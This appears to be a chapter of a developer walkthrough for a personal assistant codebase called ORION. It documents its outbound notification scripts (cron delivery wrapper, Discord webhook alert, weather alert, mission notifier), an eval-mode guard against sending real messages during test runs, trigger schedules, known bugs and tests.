- **`lib/notify/triage.mjs` is a separate, unused module.** Created by an agent task (`0b4ede8` 2026-10-01 "agent(triage): Notification triage and digest", part of the `orion-truthful` plan). It exports `triage(note, opts)` and `digest(items, {now})`. `triage` takes `{app, title, body, sender?, at: {date, minute}}` and returns `{action: "drop"|"now"|"digest", reason, summary}`: rule 1 drop duplicates (same app/sender/body within 30 min); rule 2 VIPs -> `now`; rule 3 urgent words (`urgent, emergency, asap, call me, are you ok, hospital, cancelled, canceled, moved to, room change, deadline extended, due in 1 hour, fraud, suspicious, verification code, 2FA`) -> `now`; rule 4 Canvas, Outlook mentioning Northeastern/nulondon (`school`), or Monzo/Revolut/bank with a currency amount (`money`) -> `now`; rule 5 promo apps (Temu, Shein, YouTube, Reddit, Duolingo), non-DM social (Instagram, TikTok, Snapchat) and promo keywords (`sale, % off, deal, limited time, unsubscribe, new episode, trending, you might like, recommended, streak`) -> `drop`; rule 6 everything else -> `digest` (the quiet-hours/busy branch returns the same result as the else branch, lines 140-145). `digest` groups by sender/app and renders `While you were busy: N messages.` plus up to ~8 lines `name (count): last body`. Its only importer is `tests/truthful-triage.test.mjs`; no script, plugin file or Swift code calls it **(grep over `scripts`, `tests`, `plugin/orion-control/src`, `native`, 2026-10-14)**. Treat it as a tested prototype for the future notification-digest feature.
- **Contracts**: `watches.json` `{watches:[...], people:[...], gate:bool, mail:bool, seen:{texts:[...], mail:[...]}, mailCheckedAt?, mailProblem?}`; reads `messages-recent.json` and `location.json`; `local-usage.jsonl`.
- **Calls out to**: open-meteo (geocoding + forecast), Ollama on localhost:11434, `orion-gmail-search`, `orion-reach`, `/usr/bin/pmset`.
- **History**: `a139f4b` 2026-10-07 (creation), `562c9f1` 2026-10-07 (runs every 5 min; the app exports incoming texts), `dce48ae` 2026-10-08 (`weather.mjs` split out of `orion-watches` so the briefing could share it).
- **Gotchas & lessons**
  - The local model is only asked when plugged in; on battery you get people + urgent words only. An email from an unknown sender on battery that is not urgent is dropped permanently (it enters `seen`).
  - `weather watch` says "told once a day" but `firedOn` is set only when a hit happens; an unfired watch is rechecked hourly.
  - `orion-watches` has no per-run eval guard other than `sandbox()` (eval ON + sandbox calendar). With eval ON but no sandbox calendar, it runs and `orion-reach` refuses.
  - Weather needs open-meteo reachable; a failure is swallowed (`.catch(() => null)`), so a watch silently does not fire.
- **Walk it yourself**: `node scripts/orion-watches list` (read-only); `node scripts/orion-watches tick --dry-run` (reads Gmail/weather but sends nothing; **it calls the local model if plugged in**, so skip if you want zero side effects); `tests/reach-triage.test.mjs`; `grep -rn "lib/notify" scripts tests plugin native`.
- **Questions to ask your tutor**: (1) Why `num_predict: 3` and `temperature: 0`? (2) What is the cost of letting the local model run only on AC power? (3) What is the difference between the two `triage.mjs` files and which one runs in production? (4) How would you add an `orion-watches add` kind for a bus time?

---

### 4.7 Path B: `orion-cron-deliver`, the cron jobs, `orion-discord-alert`, `orion-weather-alert`

- **What it is** — The older outbound path. OpenClaw's scheduler runs three jobs; their output used to evaporate because the gateway has no chat channel. `orion-cron-deliver` wraps a command, filters its output and forwards what is worth sending to `orion-discord-alert`, which posts to Nick's private Discord channel through a webhook. `orion-weather-alert` is a standalone script that fetches a forecast and sends it through the same webhook. Nothing here knows whether Nick is at the Mac; there is no presence logic on Path B.
- **Where**
  - `scripts/orion-cron-deliver:1-237` (header 2-49, args 76-109, `runCommand` 120-136, state 140-159, `deliver` 161-169, history 173-181, main 185-237).
  - `scripts/orion-discord-alert:1-75`.
  - `scripts/orion-weather-alert:1-82`.
- **How `orion-cron-deliver` works**
  1. **Why it exists** (header): three cron jobs ran perfectly and delivered nowhere; `openclaw cron list` said `announce -> last (last -> no route, will fail-closed: Channel...)`. The gateway had no chat channel and installing one needs a bot token, which an assistant must not type in on his behalf. So it reuses the proven webhook path. It is not just `cmd | orion-discord-alert` because `orion-focus check` runs every minute and prints something almost every run: piped straight out that would be 1,440 Discord messages a day.
  2. **Arguments** (`:76-109`): everything before the first `--` is flags, everything after is the command (no `--` or no command -> usage, exit 2). `--label` must match `^[a-z0-9][a-z0-9-]{0,39}$`. `--match` is compiled as `new RegExp(raw, "m")`. `--min-interval-minutes` must be a non-negative finite number (default `DEFAULT_MIN_INTERVAL_MINUTES = 10`).
  3. **Run** (`runCommand`): `spawn(executable, args, {stdio: ["ignore","pipe","pipe"]})`; stdout and stderr are both captured **and** echoed through, so `openclaw cron runs` still shows real output. Spawn error -> code 127.
  4. **Filter and gate** (`:185-219`), in this order, each recording one outcome line and exiting with the **wrapped command's own exit code**:

| Order | Condition | Outcome (history) | Message sent? |
|---|---|---|---|
| 1 | combined stdout+stderr trimmed is empty | `silent` | no |
| 2 | `--match` given and no match | `no_match` | no |
| 3 | same `[label] body` as last delivery and < 6 h ago | `duplicate` | no |
| 4 | less than `--min-interval-minutes` since the last delivery for this label | `held_back` (also prints a stderr note) | no |
| 5 | alert script exits non-zero | `delivery_failed` (stderr: `... the message was NOT delivered`) | no |
| 6 | alert script exits 0 | `delivered` (state saved) | yes |

  5. **Message**: body capped at 1200 characters (`MAX_BODY`; Discord's limit in the alert script is 1500 bytes, headroom left) with `\n…(truncated)`, prefixed `[<label>] `. Delivery is `spawn(scripts/orion-discord-alert, [text])`.
  6. **State** (immutable update: `{...state, [label]: {at, message}}`): `cron-delivery.json` is written only on successful delivery. History: append-only `cron-delivery-history.jsonl`, each row exactly `{v: 1, at: <ms>, label, outcome, exitCode}`, mode 0600. A missing or corrupt state file never blocks a delivery ("the worst case is one duplicate message; the alternative is silence"). History or state write failures only log to stderr.
  7. **Exit codes**: always the wrapped command's code. A failed delivery never fails the cron job ("the job DID run").
- **Flags of `orion-cron-deliver`**

| Flag | Required | Default | Effect |
|---|---|---|---|
| `--label <name>` | yes | - | Key for state/history and the `[label]` prefix. Lowercase letters, digits, hyphen; max 40 chars. |
| `--match <regex>` | no | deliver any non-empty output | Only output matching (multiline flag) is delivered. Silence stays meaningful. |
| `--min-interval-minutes <n>` | no | 10 | Minimum gap between deliveries for the same label (0 disables the interval but not the 6 h dedupe). |
| `--` | yes | - | Separator; the command and its args follow. |

- **The cron jobs** (names and schedules only; definitions live in OpenClaw's own store, `~/.openclaw/state/openclaw.sqlite`, and I did **not** open it, so exact commands and `--match` patterns are **unverified**; the schedules come from `docs/planning/RISK_SWEEP.md:195,279` and `docs/planning/v2/HANDOFF.md:82-84`, and the label names from `cron-delivery-history.jsonl`):

| Job | Schedule | Delivery label | What it runs |
|---|---|---|---|
| `orion-focus-guard` | `* * * * *` (every minute) | `focus-guard` | `orion-focus check` |
| `orion-standing-orders` | `0 * * * *` (hourly) | `standing-orders` | `orion-standing` |
| `orion-daily-memory` | `10 2 * * *` | `daily-memory` | `orion-daily && openclaw memory index` |

  All three were re-homed to `Europe/London` on 2026-09-25 (`docs/planning/v2/PHASE_GATES.json:3284`; earlier they were pinned `America/New_York`). They run inside the `ai.openclaw.gateway` launchd agent. A separate launchd job `com.nickmadaio.orion.daily` (00:20 plus `RunAtLoad`, from `native/launchd/`) is not a cron job. The history ledger (dossier counts, 2026-10-14): `focus-guard` 17,518 `no_match` and 1 `delivered`; `standing-orders` 303 `silent`, 60 `no_match`, 29 `delivery_failed`; `daily-memory` 13 `delivered`, 4 `delivery_failed` (DNS: "Could not resolve host"). That is the filter doing its job: 17,518 minute-ticks produced one Discord message.
- **What the wrapped commands print** (why the filters matter): `orion-focus check` (`scripts/orion-focus:368-401`) speaks on a strike-based cooldown (`{1: 6 min, 2: 4 min}`, else 2 min; strikes drop by one for each on-task minute), and deliberately ignores quiet hours ("Nick started this session on purpose, possibly at 1am", `:360-366`). Its `announce` only writes stdout (speech is reserved for native voice replies), so Discord is its only outlet. `orion-standing` (`scripts/orion-standing:66-69,797-798`) has quiet hours 23:00-08:00 (`QUIET_FROM/QUIET_UNTIL`); during them only `severity === "urgent"` findings are spoken unless `--force`; `auto` mode picks `morning` at 08:00, `evening` at 21:00, else `check`; and `--notify` routes through `orion-notify` (4.8). Whether the cron job passes `--notify` I could not verify.
- **`orion-discord-alert`** (`scripts/orion-discord-alert`)
  - What: send one short, opt-in alert to Nick's private Discord channel by webhook. Usage `orion-discord-alert <short alert message>` (all argv joined with spaces and trimmed). There are no flags.
  - Steps: (1) `refuseDuringEval("the Discord alert")` runs before anything else (`:18`), prints `Not sent: ...` and exits **0**; (2) empty message -> usage, exit 2; (3) NUL byte or more than 1500 UTF-8 bytes -> `Discord alerts must be short plain text (1–1500 UTF-8 bytes).` exit 2; (4) parse the `.env` file (path `$ORION_ENV_PATH` or `<repo>/.env`) as `KEY=value` lines (quotes stripped); (5) require `ORION_DISCORD_NOTIFICATIONS === "true"` and a `ORION_DISCORD_WEBHOOK_URL` else `Discord alerts are not enabled in Orion’s local settings.` exit 2; (6) the URL must match `^https://(discord.com|discordapp.com)/api/webhooks/<id>/<token>$` else exit 2; (7) POST JSON `{content, allowed_mentions: {parse: []}, flags: 4096 (only if ORION_DISCORD_SILENT=1)}` with `/usr/bin/curl --fail-with-body --silent --show-error --request POST --header "Content-Type: application/json" --header "User-Agent: Orion/1.0" --data-binary @- <webhook>` feeding the payload on stdin so the URL is never in a shell string (it is in curl's argv, though); (8) success prints `Discord alert delivered.`; curl failure prints `Discord alert was not delivered: <first 240 chars>` and exits 1.
  - Secret handling: the webhook value lives only in the repo `.env` (`ORION_DISCORD_WEBHOOK_URL`; `.env.example` ships it empty and `ORION_DISCORD_NOTIFICATIONS=false`). It is never accepted as an argument and never printed. `allowed_mentions` is disabled so a reminder cannot ping people or roles. Flag 4096 is Discord's SUPPRESS_NOTIFICATIONS: the message lands but the phone does not buzz.
  - History: `154c3fb` 2026-08-04 (created), `c2eda84` 2026-09-30 (eval guard).
  - Gotcha: the eval refusal exits 0, so callers believe it worked (bug 4).
- **`orion-weather-alert`** (`scripts/orion-weather-alert`)
  - What: fetch a concise forecast and deliver it through `orion-discord-alert`. Usage `orion-weather-alert [place]`. The only argument is an optional place name; with none, the place comes from `~/.openclaw/orion-controlled/location.json` `place` (kept by `orion-timezone`), falling back to the string `Montvale, New Jersey` (a leftover of Nick's old home, kept only for a machine with no record; the comment at `:11-26` explains the hardcoded-home bug).
  - Steps: `curl --fail --silent --show-error --max-time 10` to `https://geocoding-api.open-meteo.com/v1/search?name=<place>&count=1&format=json`, then `https://api.open-meteo.com/v1/forecast?latitude=..&longitude=..&current=temperature_2m,apparent_temperature,weather_code,wind_speed_10m&daily=temperature_2m_max,temperature_2m_min,weather_code,precipitation_probability_max&forecast_days=3&timezone=auto`. Builds `Weather update for <name>: <sky>, <F>°F (feels <F>°F), wind <n> km/h. <date>: <lo>–<hi>°F, <sky>, <n>% precip.` x3 days (Fahrenheit even though Nick now lives in London; a candidate fix) and spawns `node scripts/orion-discord-alert <message>` with inherited stdio; its exit code is the script's.
  - **It messages Nick.** The 2026-09-30 incident that created eval mode: asked "do I need an umbrella?", a scenario run executed this script and a real message reached Discord (`lib/eval-mode.mjs:1-5`). The model is now told never to run it for a weather question (`plugin/workspace/AGENTS.md:223`: "never run `orion-weather-alert` (it messages him)"); `plugin/orion-control/src/selfrepair.ts:366` lists it in `OPERATIONAL_SCRIPTS` ("wrapper scripts with no authority surface: repairable under the ordinary gate", i.e. the self-repair loop may edit it; this is about editing the script, not about running it). It has no eval check of its own; protection is the guard in `orion-discord-alert`.
  - Errors: no geocoding hit -> uncaught `Error("could not find <place>")` (non-zero exit with a stack trace).
  - History: `154c3fb` 2026-08-04 (created), `50f7110` 2026-09-01 (default place from `location.json`, London).
  - Do not confuse with the weather read used for answers: `weather_now` in `plugin/orion-control/src/catalog.ts:2485` / `ambient.ts:28-29`, which only reads open-meteo and never sends.
- **Contracts**
  - `cron-delivery.json`: `{ "<label>": {at: <ms>, message: "[label] ..."} }`.
  - `cron-delivery-history.jsonl`: `{v:1, at, label, outcome: silent|no_match|duplicate|held_back|delivery_failed|delivered, exitCode}`.
  - Env: `ORION_ENV_PATH`, `ORION_DISCORD_SILENT`, `ORION_EVAL_MARKER`; `.env` keys `ORION_DISCORD_NOTIFICATIONS`, `ORION_DISCORD_WEBHOOK_URL`.
  - Hard-coded path: `orion-cron-deliver:56` uses `~/Desktop/ORION` (the repo), not the installed copy, to find `orion-discord-alert`.
- **Calls out to**: `scripts/orion-discord-alert`, the Discord webhook (HTTPS POST via curl), open-meteo.
- **History** (`orion-cron-deliver`): `93e9a42` 2026-08-20 (checkpoint), `9c36b1c` 2026-09-26 "keeps an outcome history", `4a2816d` 2026-09-27 "record silent only for a silent run; one outcome line per run" (a bug where every delivered run wrote two history lines).
- **Gotchas & lessons**
  - `orion-discord-alert` exits 0 while refusing in eval mode, so `orion-cron-deliver` records `delivered`, saves state, and then **suppresses the same real message for 6 hours**.
  - DNS/network failures show as `delivery_failed` and are never retried; the next run will try again only if output is still produced and the interval allows.
  - `--match` regexes break silently when the wrapped output format changes (`AGENTS.md:671`); a Swift test comment (`native/Orion/Tests/SessionDomainTests/ZonedTimeTests.swift:346`) notes an unescaped regex will miss.
  - Path B ignores presence: a Discord message arrives whether or not he is at the Mac.
- **Walk it yourself**: `sed -n 185,237p scripts/orion-cron-deliver`; `tail -3 ~/.openclaw/orion-controlled/cron-delivery-history.jsonl`; `cat ~/.openclaw/orion-controlled/cron-delivery.json` (message text); `tests/automation-hist-cron-deliver.test.mjs` (stubs the alert script, never sends).
- **Questions to ask your tutor**: (1) Why not simply install a Discord channel in OpenClaw? (2) Why does dedupe use a 6 h window but rate limit 10 min? (3) What would break if the wrapper returned a non-zero code when delivery failed? (4) Why does `silent` get recorded for a command that printed nothing but `no_match` for one that printed something? (5) How would you make `orion-discord-alert` exit non-zero (or distinct) on an eval refusal without breaking callers?

---

### 4.8 `orion-notify` (mission alerts)

- **What it is** — The "outbound voice while Nick is away" for long-running missions. It deliberately has no general `send` verb: only five events are allowed (`started`, `milestone`, `decision`, `blocked`, `complete`). Header rationale: a notifier wired to tool calls produces forty messages an hour, Nick mutes it, and then the one message that mattered (the blocked one) arrives muted. The noise control is a filter on vocabulary, not on text.
- **Where** — `scripts/orion-notify:1-417` (events 57-63, constants 65-73, state 82-149, validation 153-183, `render` 187-197, transport 204-249, suppression 253-277, commands 281-417).
- **How it works**
  1. `parseArgs` (163-183): positional words and `--key value` flags; `--dry-run` and `--urgent` are booleans; other flags need a value or it fails with `--<key> needs a value`.
  2. Dispatch on the first positional: `status`, `flush`, or an event name; anything else exits 2 listing the allowed verbs.
  3. For an event: `<mission-id>` must match `^[a-z0-9][a-z0-9-]{0,39}$`; the message is joined from the rest, whitespace-collapsed, refused if empty, containing control characters, or over 1200 bytes (`cleanText`, 153-161). `--approval "<text>"` (<= 200 bytes) is only valid on `blocked` and mints a pending approval id `ap-<8 hex>`; "that id is the ONLY thing a remote approve can name", so an inbound message can never be a blanket authorisation.
  4. **Rendering** (`render`): `Orion | <LABEL> | <mission>` newline message; for `blocked` with approval: `Waiting on: <request>` and `Reply "approve <id>" or "deny <id>".`; for other events except `complete` and `blocked`: `No action needed.` Labels: `MISSION STARTED`, `MILESTONE REACHED`, `IMPORTANT DECISION MADE`, `BLOCKED - INPUT REQUIRED`, `MISSION COMPLETE`.
  5. **Suppression** (`suppressionReason`, 258-277), skipped for `blocked` and `--urgent`: duplicate (same event, mission and message within 30 min); per-event minimum gap (`milestone` 20 min, `decision` 10 min per mission); global cap 6 messages per rolling hour. **Quiet hours** 23:00-08:00 (`QUIET_FROM = 23`, `QUIET_UNTIL = 8`): non-urgent traffic is *deferred*, not dropped, into `notify.deferred` and goes out as one `OVERNIGHT DIGEST` on `flush`. A deferred or suppressed event still updates the mission's status.
  6. **Transport** (`resolveTransport`, 204-220): `--channel`/`--target` flags or `ORION_NOTIFY_CHANNEL`/`ORION_NOTIFY_TARGET` -> `openclaw message send --channel <c> --target <t> --message <text>` (binary `~/.openclaw/bin/openclaw`, 30 s timeout); else the first enabled `channels[*]` entry with a `defaultTo` in `~/.openclaw/openclaw.json`; else `scripts/orion-discord-alert <text>`. There is no `channels` block today, so it is always Discord.
  7. **State** is `~/.openclaw/orion-controlled/remote.json` shared with `orion-remote`, under a lock file `remote.json.lock` created with exclusive-open (`wx`), retried every 100 ms for up to 60 tries, stale after 15 s; the state is re-read inside the lock (the lost-update comment at 99-113). The Swift app copies this exact lock protocol (`native/Orion/Sources/SessionService/FileLock.swift:36`). A corrupt state file falls back to empty history ("losing the rate limiter is survivable; losing the ability to say BLOCKED is not").
  8. A **dry run** is checked against the limiter but does not consume budget (`:395-411` comment: an earlier version consumed it, and one pass over five event types burned most of the hourly cap, so the next real BLOCKED went to nobody).
- **Flags / verbs of `orion-notify`**

| Invocation | Effect |
|---|---|
| `started <mission> "<text>"` | Event, label MISSION STARTED, no minimum gap, status `running`. |
| `milestone <mission> "<text>"` | Event; 20 min per-mission gap; "No action needed." |
| `decision <mission> "<text>"` | Event; 10 min gap; "No action needed." |
| `blocked <mission> "<text>" [--approval "<what>"]` | Exempt from quiet hours, dedupe and caps. With `--approval` prints `pending approval id: ap-xxxxxxxx`. |
| `complete <mission> "<text>"` | Event, status `complete`. |
| `flush` | Send the deferred queue as one `OVERNIGHT DIGEST | N update(s)` message; clear the queue on success. `nothing deferred` if empty. |
| `status` | Prints sent-in-last-hour `n/6`, deferred count, whether quiet hours now, each mission's status, pending approvals. Read-only. |
| `--urgent` | Bypass quiet hours and suppression. |
| `--dry-run` | Render and print `--- DRY RUN (<where>) ---`; do not send; do not consume the rate budget. |
| `--approval "<text>"` | Only for `blocked`. |
| `--channel <c>` / `--target <t>` | Force the OpenClaw transport (both needed). |
| `--now <ISO>` | Test seam: pretend it is this time (affects quiet hours and the limiter). |

- **Contracts**: `remote.json` shape `{missions:{id:{status,priority,history,lastEvent,lastEventAt}}, pending:{apId:{missionId,request,status,createdAt}}, notify:{sent:[{event,missionId,message,at}], deferred:[...]}}` (`sent` pruned to 24 h). Exit 0 normally, 1 on delivery failure, 2 on usage errors.
- **Calls out to**: `orion-discord-alert`, optionally `openclaw message send`.
- **History**: `d9cf665` 2026-08-11 "the orion-* wrapper toolbelt" (the only commit touching it). Callers: `orion-standing --notify` (`scripts/orion-standing:812-845`: urgent findings -> `blocked --urgent`, otherwise `milestone`, mission id `standing-<morning|evening|check>`); model-facing docs `plugin/workspace/TOOLS.md:69`, `PLAYBOOK.md:92`; `orion-remote` is the inbound half (the `approve`/`deny` reply).
- **Gotchas & lessons**
  - **No eval check of its own.** If `openclaw message send` is ever configured, the openclaw transport would send during an evaluation; today the Discord fallback is protected only by the guard inside `orion-discord-alert`, and since that guard exits 0, `orion-notify` counts the refused message as **sent** (consuming rate budget and, for `flush`, clearing the deferred queue).
  - **Nothing ever calls `flush`** (grep over the repo), so overnight-deferred messages stay in `remote.json` indefinitely **(inferred from the absence of callers; the cron store was not opened)**.
  - Quiet hours here (23-08) differ from `orion-reach`'s (planned night, currently dead) and from `lib/notify/triage.mjs`'s default (`start 1410 = 23:30`, `end 450 = 07:30`).
- **Walk it yourself**: `node scripts/orion-notify status` (read-only); `node scripts/orion-notify milestone demo "x" --dry-run` is documented as non-sending but still writes `remote.json` mission state, so prefer reading `sed -n 281,417p scripts/orion-notify`.
- **Questions to ask your tutor**: (1) Why filter on vocabulary instead of text? (2) Why does `blocked` bypass every suppressor? (3) What is a "lost update" and how does the lock plus re-read prevent it? (4) Why must a dry run not consume the rate budget?

---

### 4.9 `orion-login-item`

- **What it is** — A zsh script that adds or removes `/Applications/Orion.app` from the macOS Login Items so the menu-bar app (which runs the 5-minute nudge clock) starts at login. Header: opt-in because it changes a system setting; never done for you by `orion-setup`.
- **Where** — `scripts/orion-login-item:1-73` (arg loop 22-29, `listed` 31-34, status 37-39, remove 41-48, add 50-71).
- **How it works**: `listed()` runs `osascript -e 'tell application "System Events" to get the name of every login item'` and greps for `Orion`. `add` requires `/Applications/Orion.app` (else `... does not exist yet — run ./scripts/orion-setup first.` exit 1), no-ops if listed, otherwise `make login item at end with properties {path:"/Applications/Orion.app", hidden:true, name:"Orion"}` (hidden so no window flashes) and re-checks, printing manual System Settings steps and exit 1 on failure (macOS may have prompted for System Events control).
- **Flags**: none = add; `--remove` delete the item (exit 1 if still listed); `--status` print `Orion starts at login.` or `Orion does not start at login.`; `-h`/`--help` usage, exit 0; anything else `unknown option: ...`, exit 64.
- **Contracts / side effects**: modifies System Events login items (a system setting, hence "ask first"). Needs Automation permission for System Events.
- **History**: `e4c3ba2` 2026-07-30 "App icon rendered from the hologram, login item, permissions diagnosis".
- **Gotchas**: the repo also ships a launchd agent `com.nickmadaio.orion.dashboard` that runs `/usr/bin/open -na Orion` at load (dossier), so there are two mechanisms for "start the app at login"; the login item is the documented opt-in one, the launchd one is what keeps the dashboard/nudge clock alive on this machine. Do not run this script without Nick asking; it edits a system setting.
- **Walk it yourself**: `./scripts/orion-login-item --status` is read-only.
- **Questions to ask your tutor**: Why does `hidden:true` matter? Why is login-at-startup central to a proactive assistant that has no cron job?

---

### 4.10 Eval-mode guard: `scripts/lib/eval-mode.mjs`

- **What it is** — A 21-line module that lets any script that sends something to a person say "not sent" instead during an evaluation run. Created in `c2eda84` 2026-09-30 after the umbrella incident: a scenario run asked "do I need an umbrella?", ORION ran `orion-weather-alert`, and a real message reached Nick's Discord (`eval-mode.mjs:1-5`).
- **How it works**: `EVAL_MARKER = $ORION_EVAL_MARKER || ~/.openclaw/orion-controlled/eval-mode`. `evalMode(now)` is true while the marker file's mtime is under 2 hours old (a forgotten marker cannot silence ORION for good). `refuseDuringEval(what)` prints `Not sent: <what> — ORION is in an evaluation run, so nothing goes out to anyone.` and `process.exit(0)`. `scripts/orion-eval-run` (not in this chapter) turns the marker on for a run and always removes it.
- **Who uses it in this chapter**: `orion-reach` (unless `--dry-run`), `orion-discord-alert` (first thing), `orion-checkin`, `orion-watch`; `sandbox()` in `bridge-path.mjs` (eval ON and a sandbox calendar exist) is the narrower gate used by `orion-proactive`, `orion-watches`, `orion-morning`. `orion-notify` and `orion-cron-deliver` have **no** check; they rely on `orion-discord-alert`.
- **Gotcha**: exit code 0 on refusal is deliberate for the *model* (stdout `Not sent:` is read by the claim checker; `plugin/orion-control/src/job-instructions.ts:7` tells the model "`Not sent: ...`: nothing reached his phone or the person") but wrong for *script callers* that treat 0 as sent (bugs 2 and 4).

---

### 4.11 What triggers what: cron, launchd, app timers

Names and schedules only.

| Trigger | Schedule | Runs | Reaches Nick via |
|---|---|---|---|
| ORION Mac app, `LifeWatch` (dashboard `RefreshTicker` 3 s, throttled) | every 5 min while the app runs | `orion-watch tick --json`, `orion-watches tick`, `orion-proactive tick` | `orion-reach` (Path A) |
| ORION Link app, `LinkEngine` timer | outreach drain every 4 s; `orion-checkin tick --json` and `alerts-outbox.jsonl` drain every 8th tick (~30 s) | `orion-checkin tick --json`; outbox drains | CloudKit chat record + iPhone notification |
| Link app, phone wake signal | event-driven (unplugged / phone used / ORION opened after the alarm) | `orion-morning signal <event> --at <ISO>` | `orion-reach --kind morning --loud` + `orion-lights` + morning screen |
| Mac app reminder scheduler | when a reminder Nick asked for fires | Swift `announceReminder` -> `orion-reach --kind reminder --urgent` | Path A |
| OpenClaw cron `orion-focus-guard` | `* * * * *` | `orion-focus check` wrapped by `orion-cron-deliver --label focus-guard` | Discord |
| OpenClaw cron `orion-standing-orders` | `0 * * * *` | `orion-standing` wrapped by `orion-cron-deliver --label standing-orders` | Discord (and `orion-notify` if `--notify` is passed; unverified) |
| OpenClaw cron `orion-daily-memory` | `10 2 * * *` (Europe/London) | `orion-daily && openclaw memory index` wrapped by `orion-cron-deliver --label daily-memory` | Discord |
| launchd `com.nickmadaio.orion.dashboard` | `RunAtLoad` | `/usr/bin/open -na Orion` (starts the app that owns the 5-min clock) | - |
| launchd `ai.openclaw.gateway` | KeepAlive, port 18789 | the OpenClaw gateway, which hosts the cron scheduler | - |
| launchd `com.nickmadaio.orion.daily` | 00:20 daily plus `RunAtLoad` (repo copy under `native/launchd/`) | daily job (not delivery) | - |
| Model request | when Nick asks | model `exec`s `orion-reach`, `orion-watches`, `orion-lights`, `orion-wake` | per script |

Active launchd agents on this Mac matching `orion|openclaw` (read 2026-10-14): `ai.openclaw.gateway`, `com.nickmadaio.orion.dashboard`, `com.nickmadaio.orion.remote`, `com.nickmadaio.orion.tts`, `com.nickmadaio.orion.voiceid`.

### 4.12 Weather code map (where weather appears and who reads it)

| Code | Source | Output |
|---|---|---|
| `scripts/lib/reach/weather.mjs` | open-meteo hourly, `forecast_days=2` | shared by `orion-watches` and `orion-morning` |
| `scripts/lib/reach/morning.mjs` (`describeSky`, `weatherFacts`, `weatherLine`, `rainLabel`, `weatherSymbol`, `buildView`) | consumes `weather.mjs` | the spoken line, the screen's weather panel, SF Symbol names |
| `scripts/lib/reach/triage.mjs` (`weatherHit`, `parseWeatherWatch`) | consumes `weather.mjs` | weather-watch alerts |
| `scripts/orion-weather-alert` | open-meteo `current` + `daily`, 3 days, Fahrenheit | Discord (sends!) |
| `plugin/orion-control/src/ambient.ts:28-29`, `catalog.ts:2485` (`weather_now`) | open-meteo | read-only tool the model uses for "what's the weather / umbrella?" |
| `scripts/lib/life/morning-brief.mjs:17,40` | optional `weather.rainChance` | adds "Rain likely — take a jacket." to the older daily brief (not the spoken morning briefing) |

### 4.13 Known bugs and open issues (all verified against code at `6c93032`, 2026-10-14)

1. **Quiet hours never hold anything.** `presence.mjs:22` checks `sleep.state === "night"`; `orion-now` never emits it (`sleep-state.mjs:6-19`; `orion-now:39`). `hold` is unreachable (0 of 37 ledger rows) and nothing would release held messages even if it were (`orion-reach:68` skips the outbox; no replay code).
2. **Gated messages are marked "said".** `orion-proactive:80` sets `sent[key] = true` on exit status 0, but `orion-reach` also exits 0 for `NOT SENT` (`:45`) and the eval refusal (`eval-mode.mjs:20`). A rate-limited nudge is suppressed for the rest of the day.
3. **Check-in alerts can be lost; outboxes race.** `LinkEngine.deliverCheckins` truncates `alerts-outbox.jsonl` before the CloudKit save and does not restore it on failure; `deliverOutreach` and `deliverCheckins` both use read-then-truncate, so a line appended in between disappears.
4. **Eval refusals look like successes.** `orion-discord-alert` exits 0 when refusing, so `orion-cron-deliver` records `delivered` and saves state (suppressing the real message for 6 h) and `orion-notify` counts it as sent.
5. **`orion-notify` has no eval guard** of its own on the `openclaw message send` transport.
6. **Installed `orion-watch` is behind the repo** (missing the `orion-tasks sweep` block from `6c93032`, `scripts/orion-watch:137-145`). Not in this chapter's scope but it is the same install-copy problem.
7. **`displayAsleep` is never populated** (`facts.mjs:27-35`), so a sleeping display is not "away" unless idle >= 5 min.
8. **Unreadable idle time means "at the Mac"** (`Number(null) < 300`).
9. **`orion-weather-alert` reports Fahrenheit** for a London-based Nick; and `orion-reach --kind` usage text omits `morning`.
10. Stale comment: `AppDelegate.swift:207` says `orion-reach` opens the URL before appending; it appends first.

### 4.14 Tests

| File | What it pins |
|---|---|
| `tests/reach-route.test.mjs` | channel truth table; quiet hold and urgent bypass (with a hand-set `quiet: true`, which is why the real-world dead code went unnoticed); volume; dedupe and 6/hour |
| `tests/reach-proactive.test.mjs` | each `decide()` rule: no bedtime in a session or out, wind-down/bedtime once, `bed-late` only when at the Mac, session-end texts, leave, gap, due |
| `tests/reach-morning.test.mjs` | gate (04:00-13:00, 45 min before alarm, stale, once a day), briefing wording, weather wording, screen model, alarm choice |
| `tests/reach-triage.test.mjs` | important people, battery rule, local-model verdict, weather watch parse/fire |
| `tests/automation-hist-cron-deliver.test.mjs` | the six outcomes, one history line per run, history shape, unwritable history does not change exit code (uses a stubbed alert script in a temp HOME) |
| `tests/truthful-triage.test.mjs` | `lib/notify/triage.mjs` only |

The pure-function/impure-shell split is why these tests need no mocks except for the cron wrapper. Note that the pure functions are tested with inputs the real shell cannot produce (the `quiet: true` input, a `night` state), which is how bug 1 survived 100 % passing tests.


---

## 5. Attention: scripts/lib/attention/*

**Snapshot note.** Everything in this section is committed (the attention engine landed 2026-09-27 in a batch of `agent(att-*)` commits; see History in each subsection). One fact frames the whole chapter: **nothing in the live model/plugin path calls the attention engine.** A repo-wide grep for `attention-collect`, `lib/attention`, `rankAttention` and `attentionGate` finds only the engine itself, its tests, and docs (`docs/planning/v2/ATTENTION_ENGINE.md`, `docs/planning/v2/ATTENTION_AND_OPS_REVIEW.md`, `HANDOFF.md:630`). `orion-attention-collect` is not on a cron I could find and is driven by fixture files. The one consumer outside the engine is the iOS/Mac link helper, which reads the feed file `~/.openclaw/orion-controlled/attention-today.json` (`native/OrionLink/Sources/LinkCore/SnapshotReader.swift:18`). Treat this section as "a built, tested, mostly un-wired pipeline", not as the thing that decides today's proactive nudges (those are `orion-watch`, `orion-reach` etc., covered in other chapters).

### 5.0 Pipeline overview

The designed flow, with the modules that do each step:

```
sources (calendar / waiting / focus / manual)        sources/*.mjs
   -> collectAttention  (items + outages)            collect.mjs
   -> addToQueue        (persist, dedup by key)      store.mjs
   -> openItems         (open + un-snoozed, not expired)
   -> rankAttention     per entry:
         scoreAttentionItem  -> score or null        score.mjs
         attentionGate       -> interrupt/today/drop gate.mjs
   -> buildTodayFeed    (interrupt[], today[], outages, note)   today-feed.mjs
   -> attentionDigest   (plain text)                 digest.mjs
Not wired into the CLI pass: dedup.mjs, novelty.mjs, budget.mjs, explain.mjs, simulate.mjs, urgency.mjs
```

